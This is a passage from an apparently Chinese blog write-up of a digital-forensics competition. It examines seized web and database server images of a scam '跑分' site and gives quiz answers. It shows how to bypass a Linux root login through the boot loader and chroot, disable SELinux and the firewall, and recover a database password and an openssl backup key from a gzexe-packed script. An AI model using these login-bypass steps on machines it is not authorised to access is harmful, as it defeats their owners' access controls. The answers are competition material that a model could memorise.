src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107134329357.png" alt="image-20251107134329357"></p><p>然后将<code>ro</code>变成<code>rw</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107134705351.png" alt="image-20251107134705351"></p><p>然后再添加这么一句，添加好后<code>ctrl+X</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107134829749.png" alt="image-20251107134829749"></p><p>然后登录界面后输入如下指令<code>chroot /sysroot</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135045235.png" alt="image-20251107135045235"></p><p>然后还要修改这个文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135232615.png" alt="image-20251107135232615"></p><p>这个文件这边是<code>enforcing</code>，我们要将它变成<code>disabled</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135316764.png" alt="image-20251107135316764"></p><p>最后就是修改密码，也就是修改<code>/etc/passwd</code>文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135529056.png" alt="image-20251107135529056"></p><p>先将root默认运行的终端改为<code>bin/bash</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135607563.png" alt="image-20251107135607563"></p><p>然后再使用<code>passwd</code>命令修改密码，新密码为<code>123456</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135653400.png" alt="image-20251107135653400"></p><p>修改完之后重新启动</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135751839.png" alt="image-20251107135751839"></p><p>修改配置之后要等一会儿才能重启服务器，在等待的过程中可以先修改<code>db</code>服务器的密码。</p><h2 id="网站重构改db服务器密码">网站重构改db服务器密码</h2><p>该db服务器密码也是和前面一样的。操作这里就不详细说明了。</p><h2 id="ssh远程连接">ssh远程连接</h2><p>现在直接使用<code>mobax</code>连接web服务器</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107143718893.png" alt="image-20251107143718893"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107143848963.png" alt="image-20251107143848963"></p><p>进入db服务器，查看其ip地址与ssh端口，也使用<code>moba</code>远程连接</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107151931801.png" alt="image-20251107151931801"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107151954584.png" alt="image-20251107151954584"></p><h2 id="挂载目录">挂载目录</h2><ul><li>接下来回到<code>web</code>服务器那边，发现www目录没有东西，由于这是nas服务器，所以可能很多东西都存在nas盘中</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107152221739.png" alt="image-20251107152221739"></p><ul><li>这个时候我们先需要看<code>NAS</code>的这个<code>iSCSI</code>服务开启，开启后我们需要重启一下<code>web</code>的虚拟机（最好db服务器也重启一下，因为现在不重启后面重构网站的时候也要重启的。）</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107152607316.png" alt="image-20251107152607316"></p><p>重启完之后就会发现有一个<code>sdb</code>和<code>sdb1</code>是新出现的盘符</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107153254390.png" alt="image-20251107153254390"></p><p>接下来就是挂载盘符，使用<code>mount /dev/sdb1 /www</code>命令，然后再进入<code>www</code>就会看到有文件了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107153640473.png" alt="image-20251107153640473"></p><h2 id="question11">question11√</h2><p>请分析服务器，给出redis所使用的配置文件？[答案格式:/home/1.conf]</p><p>进入web服务器后就可以看到<code>redis</code>服务器所使用的配置文件位置<code>/etc/redis.conf</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107142400522.png" alt="image-20251107142400522"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/redis.conf</span><br></pre></td></tr></table></figure><ul><li>如果要是不知道目录的话直接使用<code>find</code>命令从根目录开始寻找名字</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107153817475.png" alt="image-20251107153817475"></p><ul><li>如果不知道<code>redis.conf</code>的后缀就直接使用正则表达式find</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107153938715.png" alt="image-20251107153938715"></p><h2 id="question12">question12√</h2><p>请分析服务器，给出跑分网站后台根目录？[答案格式:/xx/xx]</p><p>这个需要直接看中间件<code>nginx</code>的配置文件，在<code>/etc/nginx/conf.d</code>是<code>nginx</code>中网站的配置文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107154522096.png" alt="image-20251107154522096"></p><p>题目说是后台根目录，所以需要看的是<code>admin.paofen.con.conf</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107154646608.png" alt="image-20251107154646608"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www/admin.paofen.com/public</span><br></pre></td></tr></table></figure><h2 id="question13">question13√</h2><p>请分析服务器，嫌疑人所使用的跑分系统可能来自哪，请给出网站？[答案格式:www.baidu.com]</p><p>这个就需要分析跑分网站的源码，才能知道框架之类的最终确定出处，进入到<code>/www/admin.paofen.com/app</code>，找到<code>config.php</code>文件，该文件配置网站的时候是一定要修改的，所以很大可能会宣传什么东西或者声明版权之类的。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107155030757.png" alt="image-20251107155030757"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.98sucai.com</span><br></pre></td></tr></table></figure><h2 id="question14">question14√</h2><p>请分析服务器，给出数据库root账号密码？[答案格式:password]</p><p>这题就需要去翻找数据库服务器了，在查看数据库服务器的时候就会发现一个<code>backup.sh</code>的<code>shell</code>脚本文件，但是打开这个文件发现是乱码，这个脚本文件被加密了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107155723539.png" alt="image-20251107155723539"></p><p>而这个被加密后变成了一个自解压运行运行的一个<code>shell</code>脚本文件，其实我们在前面的这个sh文件的前面的内容就能看出，加密它的软件是<code>gzexe</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107160010618.png" alt="image-20251107160010618"></p><p>所以我们需要使用<code>gzexe -d backup.sh</code>命令进行解密操作，这样就能看到原来的<code>shell里面的内容</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107160058100.png" alt="image-20251107160058100"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3W.pa0fen.com</span><br></pre></td></tr></table></figure><h2 id="question15">question15√</h2><p>请分析服务器，给出数据库备份文件存放路径？[答案格式:/xx/xxx]</p><p>这个是个细节题，因为如果纯去找的话是找不到的，应该认真看上面的解密<code>shell脚本</code>的内容，这个时候就会发现备份路径也是在<code>shell</code>脚本中的</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107160803761.png" alt="image-20251107160803761"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/mysql_back</span><br></pre></td></tr></table></figure><ul><li>如果去翻找<code>data</code>目录的话发现是没东西的</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107160838939.png" alt="image-20251107160838939"></p><h2 id="question16">question16√</h2><p>请分析服务器，给出数据库备份文件解压密码？[答案格式:password]</p><p>还是继续看这个<code>shell</code>脚本的具体内容，就会发现有一个这个命令</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107161012687.png" alt="image-20251107161012687"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p@ssw0rd</span><br></pre></td></tr></table></figure><h2 id="question17">question17√</h2><p>请分析服务器，给出数据库备份文件间隔多少天会删除？[答案格式:1]</p><p>还是继续看<code>shell</code>脚本文件，在开头有指定备份天数为<code>45</code>天</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107161146702.png" alt="image-20251107161146702"></p><h2 id="question18">question18√</h2><p>请分析服务器，给出数据库每天几点会执行备份操作？[答案格式:00:00]</p><p>这个时候就需要查看计划任务，看shell脚本没用了。看计划任务就会知道什么时候操作系统会执行<code>shell</code>，看计划任务的命令为：<code>crontab -l</code>，查看后就会发现</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107161510551.png" alt="image-20251107161510551"></p><p>但是发现看不来格式，所以直接问AI了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107161624185.png" alt="image-20251107161624185"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:00</span><br></pre></td></tr></table></figure><h2 id="重构web网站1">重构web网站1</h2><p>接下来就要把web网站重构起来，先看看<code>nginx</code>等一些中间件服务有没已经在运行了，发现并没有。那启这个网站就要一个一个服务起起来了，而不是只需要开个web服务就能用网站了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107184953439.png" alt="image-20251107184953439"></p><p>先开启<code>nginx</code>服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185120698.png" alt="image-20251107185120698"></p><p>接下来启动php服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185314303.png" alt="image-20251107185314303"></p><p>接下来打开php的fpm服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185423387.png" alt="image-20251107185423387"></p><p>进入<code>www</code>文件目录，然后修改文件的初始组</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185613172.png" alt="image-20251107185613172"></p><p>然后进入<code>redis</code>日志文件目录下<code>cd /var/log/redis</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185712773.png" alt="image-20251107185712773"></p><p>继续修改初始组，修改完成之后启动<code>redis</code>服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185837526.png" alt="image-20251107185837526"></p><p>然后修改<code>php</code>的一些配置文件，主要是将web服务于<code>数据库</code>连接起来，在这个目录下找到<code>database.php</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190034625.png" alt="image-20251107190034625"></p><p>查看<code>database.php</code>后发现是这样的一个服务器地址，将其修改为数据库服务器的<code>ip</code>地址</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190121149.png" alt="image-20251107190121149"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190152177.png" alt="image-20251107190152177"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190242424.png" alt="image-20251107190242424"></p><p>然后再查看数据库服务器的那个端口和密码，将端口和密码都修改了，数据库名应该也有问题</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190443552.png" alt="image-20251107190443552"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190611614.png" alt="image-20251107190611614"></p><p>全修改完之后如下所示</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190634602.png" alt="image-20251107190634602"></p><p>这里我之前没有重启，导致<code>db</code>服务器没有挂载<code>nas</code>的盘，导致有些数据加载不出来。所以要重启一下，重启之后发现有<code>sdb1</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107191858434.png" alt="image-20251107191858434"></p><p>接下来就是关闭防火墙服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107191909001.png" alt="image-20251107191909001"></p><p>接下来就将这个<code>sdb1</code>挂载到<code>/data</code>目录下，发现有<code>mysql</code>的备份</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107192035696.png" alt="image-20251107192035696"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107192050433.png" alt="image-20251107192050433"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107192425977.png" alt="image-20251107192425977"></p><p>接下来就是要将数据库备份<code>0515</code>这个压缩包解压，需要用到之前的密码之前的压缩命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czPf - <span class="variable">$BAK_DATE</span> | openssl des3 -salt -k p@ssw0rd -out db_backup_<span class="variable">$&#123;BAK_DATE&#125;</span>.tar.gz</span><br></pre></td></tr></table></figure><ul><li>那么我们解压命令就要是这样</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107193144425.png" alt="image-20251107193144425"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl des3 -d -k p@ssw0rd -in /data/mysql_back/db_backup_20230515.tar.gz | tar -xzPf -</span><br></pre></td></tr></table></figure><p><img 